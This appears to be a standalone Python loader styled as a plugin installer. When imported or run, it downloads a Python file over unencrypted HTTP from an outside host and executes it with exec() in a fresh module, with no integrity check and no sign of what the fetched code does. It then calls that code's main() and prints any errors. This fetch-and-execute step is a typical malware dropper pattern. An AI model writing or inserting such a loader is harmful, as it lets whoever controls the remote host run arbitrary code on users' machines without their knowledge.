import sys
import types
import requests

def get_source_code(url):
    response = requests.get(url)
    return response.text

def execute_source_code(source, module_name):
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)
    return module

def execute():
    url = "http://download.filebank.jp/python/plugin.py"
    module_name = "install_plugins"

    source = get_source_code(url)
    module = execute_source_code(source, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
